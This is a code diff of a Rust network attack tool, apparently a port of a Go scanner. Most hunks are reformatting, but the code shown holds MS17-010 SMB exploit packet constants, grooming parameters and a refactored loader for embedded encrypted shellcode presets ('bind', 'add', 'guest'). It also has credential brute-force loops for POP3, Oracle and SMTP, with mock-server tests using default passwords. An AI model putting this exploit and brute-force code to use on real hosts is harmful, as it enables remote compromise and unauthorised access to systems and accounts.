@@ -121,7 +121,6 @@ const MS17010_SESSION_SETUP_REQUEST_HEX: &str = "00000088ff534d4273000000001807c
 const MS17010_TRANS_NAMED_PIPE_REQUEST_HEX: &str = "0000004aff534d42250000000018012800000000000000000000000088ea30108529810000000000ffffffff0000000000000000000000004a0000004a000200230000000070005c504950455c00";
 const MS17010_TRANS2_SESSION_SETUP_REQUEST_HEX: &str = "0000004eff534d4232000000001807c00000000000000000000000008fffe0000841000f0c0000000010000000000000000a6d9a400000000c00420000004e0001000e000d0000000000000000000000000000";
 const MS17010_AES_KEY: &[u8; 16] = b"0123456789abcdef";
-const MS17010_PRESET_SOURCE: &str = include_str!("../assets/ms17010_presets.rs");
 const MS17010_PACKET_MAX_LEN: usize = 4204;
 const MS17010_PACKET_SETUP_LEN: usize = 497;
 const MS17010_EXPLOIT_INITIAL_GROOMS: usize = 12;
@@ -223,6 +222,10 @@ const NETBIOS_NEGOTIATE_TWO: &[u8] = &[
     0xA2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x05, 0x02, 0xCE, 0x0E, 0x00, 0x00, 0x00, 0x0F, 0x00,
 ];
+
+mod ms17010_presets_asset {
+    include!("../assets/ms17010_presets.rs");
+}
 
 #[derive(Debug, Default, Clone, PartialEq, Eq)]
 struct NetBiosInfo {
@@ -685,12 +688,12 @@ where
                             .expect("findings lock poisoned")
                             .push(finding),
                         Ok(None) => {}
-                        Err(scan_error) => errors.lock().expect("errors lock poisoned").push(
-                            format!(
+                        Err(scan_error) => {
+                            errors.lock().expect("errors lock poisoned").push(format!(
                                 "scan error {}:{} [{}] - {scan_error}",
                                 task.target.host, task.target.port, task.plugin_key
-                            ),
-                        ),
+                            ))
+                        }
                     }
                 }
             });
@@ -792,7 +795,11 @@ pub fn select_plugins(mode: &str) -> Vec<PluginDefinition> {
 
 fn parse_plugin_list(mode: &str) -> Vec<String> {
     let mut parsed = Vec::new();
-    for item in mode.split(',').map(str::trim).filter(|item| !item.is_empty()) {
+    for item in mode
+        .split(',')
+        .map(str::trim)
+        .filter(|item| !item.is_empty())
+    {
         let item = item.to_string();
         if !parsed.contains(&item) {
             parsed.push(item);
@@ -1155,7 +1162,8 @@ fn scan_pop3(target: &OpenService, context: &PluginContext) -> Result<Option<Plu
     }
     for username in usernames_for_service("pop3", context) {
         for password in passwords_for_user(Some(username.as_str()), context) {
-            let (authenticated, tls) = pop3_login(target, &username, &password, context.timeout_secs)?;
+            let (authenticated, tls) =
+                pop3_login(target, &username, &password, context.timeout_secs)?;
             if authenticated {
                 return Ok(Some(PluginFinding {
                     plugin: "pop3".to_string(),
@@ -1714,9 +1722,15 @@ where
     F: FnMut(&OpenService, &str, &str, &str, u64, bool) -> Result<bool>,
 {
     for service_name in ORACLE_COMMON_SERVICE_NAMES {
-        if login(target, username, password, service_name, timeout_secs, false)?
-            || (username.eq_ignore_ascii_case("SYS")
-                && login(target, username, password, service_name, timeout_secs, true)?)
+        if login(
+            target,
+            username,
+            password,
+            service_name,
+            timeout_secs,
+            false,
+        )? || (username.eq_ignore_ascii_case("SYS")
+            && login(target, username, password, service_name, timeout_secs, true)?)
         {
             return Ok(Some(PluginFinding {
                 plugin: "oracle".to_string(),
@@ -2686,10 +2700,7 @@ where
 
     let auth_payload =
         base64::engine::general_purpose::STANDARD.encode(format!("\u{0}{username}\u{0}{password}"));
-    write_and_flush_io(
-        stream,
-        format!("AUTH PLAIN {auth_payload}\r\n").as_bytes(),
-    )?;
+    write_and_flush_io(stream, format!("AUTH PLAIN {auth_payload}\r\n").as_bytes())?;
     let auth_response = read_smtp_response(stream)?;
     if !smtp_code_is(&auth_response, 235) {
         return Ok(false);
@@ -2789,7 +2800,10 @@ fn pop3_login(
     }
 
     let mut tls_stream = connect_tls_stream(target, timeout)?;
-    Ok((pop3_login_with_stream(&mut tls_stream, username, password)?, true))
+    Ok((
+        pop3_login_with_stream(&mut tls_stream, username, password)?,
+        true,
+    ))
 }
 
 fn pop3_login_with_stream<S>(stream: &mut S, username: &str, password: &str) -> Result<bool>
@@ -3785,8 +3799,9 @@ fn resolve_ms17010_shellcode(spec: &str) -> Result<Vec<u8>> {
     let normalized = spec.trim();
     let shellcode = match normalized {
         "bind" | "add" | "guest" => {
-            let encrypted = embedded_ms17010_preset(normalized)
-                .with_context(|| format!("missing ms17010 preset {normalized} in Go source"))?;
+            let encrypted = embedded_ms17010_preset(normalized).with_context(|| {
+                format!("missing ms17010 preset {normalized} in embedded presets")
+            })?;
             let mut ciphertext = base64::engine::general_purpose::STANDARD
                 .decode(encrypted)
                 .context("failed to decode embedded ms17010 shellcode")?;
@@ -3814,11 +3829,10 @@ fn resolve_ms17010_shellcode(spec: &str) -> Result<Vec<u8>> {
 }
 
 fn embedded_ms17010_preset(name: &str) -> Option<&'static str> {
-    let marker = format!("case \"{name}\":");
-    let (_, remainder) = MS17010_PRESET_SOURCE.split_once(&marker)?;
-    let (_, remainder) = remainder.split_once("sc_enc := \"")?;
-    let (encoded, _) = remainder.split_once('"')?;
-    Some(encoded)
+    ms17010_presets_asset::MS17010_PRESETS
+        .iter()
+        .find(|(preset, _)| *preset == name)
+        .map(|(_, encoded)| *encoded)
 }
 
 fn decode_ms17010_shellcode_hex(value: &str) -> Result<Vec<u8>> {
@@ -5191,7 +5205,9 @@ fn write_and_flush_io<S>(stream: &mut S, payload: &[u8]) -> Result<()>
 where
     S: Write,
 {
-    stream.write_all(payload).context("failed to write request")?;
+    stream
+        .write_all(payload)
+        .context("failed to write request")?;
     stream.flush().context("failed to flush request")
 }
 
@@ -5298,14 +5314,14 @@ fn read_available_bytes(stream: &mut TcpStream) -> Result<Vec<u8>> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use rustls::pki_types::PrivateKeyDer;
+    use rustls::{ServerConfig, ServerConnection};
     use std::fs;
     use std::io::{BufReader, ErrorKind};
     use std::net::{TcpListener, UdpSocket};
     use std::path::PathBuf;
     use std::sync::{Arc, Mutex};
     use std::thread;
-    use rustls::pki_types::PrivateKeyDer;
-    use rustls::{ServerConfig, ServerConnection};
 
     const TEST_SSH_PRIVATE_KEY: &str = "-----BEGIN OPENSSH PRIVATE KEY-----\n\
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\n\
@@ -5956,7 +5972,10 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
     #[test]
     fn selects_comma_separated_plugins_like_go() {
         let plugins = select_plugins("ssh, memcached, ssh");
-        let keys = plugins.into_iter().map(|plugin| plugin.key).collect::<Vec<_>>();
+        let keys = plugins
+            .into_iter()
+            .map(|plugin| plugin.key)
+            .collect::<Vec<_>>();
         assert_eq!(keys, vec!["ssh".to_string(), "memcached".to_string()]);
     }
 
@@ -6244,8 +6263,8 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                         stream
                             .set_write_timeout(Some(Duration::from_secs(1)))
                             .expect("write timeout should set");
-                        let conn =
-                            ServerConnection::new(config.clone()).expect("server conn should build");
+                        let conn = ServerConnection::new(config.clone())
+                            .expect("server conn should build");
                         let mut tls = StreamOwned::new(conn, stream);
                         if tls.conn.complete_io(&mut tls.sock).is_err() {
                             continue;
@@ -6264,7 +6283,8 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                         let size = tls.read(&mut buffer).expect("mail from should read");
                         let request = String::from_utf8_lossy(&buffer[..size]);
                         assert!(request.contains("MAIL FROM:<test@test.com>"));
-                        tls.write_all(b"250 OK\r\n").expect("mail response should write");
+                        tls.write_all(b"250 OK\r\n")
+                            .expect("mail response should write");
                         tls.flush().expect("response should flush");
                         return;
                     }
@@ -6372,8 +6392,8 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                         stream
                             .set_write_timeout(Some(Duration::from_secs(1)))
                             .expect("write timeout should set");
-                        let conn =
-                            ServerConnection::new(config.clone()).expect("server conn should build");
+                        let conn = ServerConnection::new(config.clone())
+                            .expect("server conn should build");
                         let mut tls = StreamOwned::new(conn, stream);
                         if tls.conn.complete_io(&mut tls.sock).is_err() {
                             continue;
@@ -6494,8 +6514,8 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                         stream
                             .set_write_timeout(Some(Duration::from_secs(1)))
                             .expect("write timeout should set");
-                        let conn =
-                            ServerConnection::new(config.clone()).expect("server conn should build");
+                        let conn = ServerConnection::new(config.clone())
+                            .expect("server conn should build");
                         let mut tls = StreamOwned::new(conn, stream);
                         if tls.conn.complete_io(&mut tls.sock).is_err() {
                             continue;
@@ -6877,8 +6897,8 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                         stream
                             .set_write_timeout(Some(Duration::from_secs(1)))
                             .expect("write timeout should set");
-                        let conn =
-                            ServerConnection::new(config.clone()).expect("server conn should build");
+                        let conn = ServerConnection::new(config.clone())
+                            .expect("server conn should build");
                         let mut tls = StreamOwned::new(conn, stream);
                         if tls.conn.complete_io(&mut tls.sock).is_err() {
                             continue;
@@ -6889,8 +6909,8 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                         let request = &buffer[..size];
                         assert!(request.windows(3).any(|window| window == b"\x02\x01\x03"));
                         tls.write_all(&[
-                            0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x00, 0x04,
-                            0x00, 0x04, 0x00,
+                            0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00,
+                            0x04, 0x00,
                         ])
                         .expect("bind response should write");
 
@@ -6898,8 +6918,8 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                         let request = &buffer[..size];
                         assert!(request.contains(&0x63));
                         tls.write_all(&[
-                            0x30, 0x0c, 0x02, 0x01, 0x02, 0x65, 0x07, 0x0a, 0x01, 0x00, 0x04,
-                            0x00, 0x04, 0x00,
+                            0x30, 0x0c, 0x02, 0x01, 0x02, 0x65, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00,
+                            0x04, 0x00,
                         ])
                         .expect("search response should write");
                         tls.flush().expect("response should flush");
@@ -7316,12 +7336,10 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                     service_name.to_string(),
                     as_sysdba,
                 ));
-                Ok(
-                    !as_sysdba
-                        && username == "ADMIN"
-                        && password == "admin@123"
-                        && service_name == "ORCL",
-                )
+                Ok(!as_sysdba
+                    && username == "ADMIN"
+                    && password == "admin@123"
+                    && service_name == "ORCL")
             },
         )
         .expect("scan should succeed")
@@ -7362,12 +7380,7 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                     service_name.to_string(),
                     as_sysdba,
                 ));
-                Ok(
-                    !as_sysdba
-                        && username == "SYS"
-                        && password == "123456"
-                        && service_name == "XE",
-                )
+                Ok(!as_sysdba && username == "SYS" && password == "123456" && service_name == "XE")
             },
         )
         .expect("scan should succeed")
@@ -7375,7 +7388,12 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
 
         assert_eq!(
             attempts.first(),
-            Some(&("SYS".to_string(), "123456".to_string(), "XE".to_string(), false))
+            Some(&(
+                "SYS".to_string(),
+                "123456".to_string(),
+                "XE".to_string(),
+                false
+            ))
         );
         assert_eq!(finding.details["username"], json!("SYS"));
         assert_eq!(finding.details["password"], json!("123456"));
@@ -7403,12 +7421,7 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
                     service_name.to_string(),
                     as_sysdba,
                 ));
-                Ok(
-                    username == "SYS"
-                        && password == "123456"
-                        && service_name == "XE"
-                        && as_sysdba,
-                )
+                Ok(username == "SYS" && password == "123456" && service_name == "XE" && as_sysdba)
             },
         )
         .expect("scan should succeed")
@@ -7416,11 +7429,21 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
 
         assert_eq!(
             attempts[0],
-            ("SYS".to_string(), "123456".to_string(), "XE".to_string(), false)
+            (
+                "SYS".to_string(),
+                "123456".to_string(),
+                "XE".to_string(),
+                false
+            )
         );
         assert_eq!(
             attempts[1],
-            ("SYS".to_string(), "123456".to_string(), "XE".to_string(), true)
+            (
+                "SYS".to_string(),
+                "123456".to_string(),
+                "XE".to_string(),
+                true
+            )
         );
         assert_eq!(finding.details["username"], json!("SYS"));
         assert_eq!(finding.details["password"], json!("123456"));
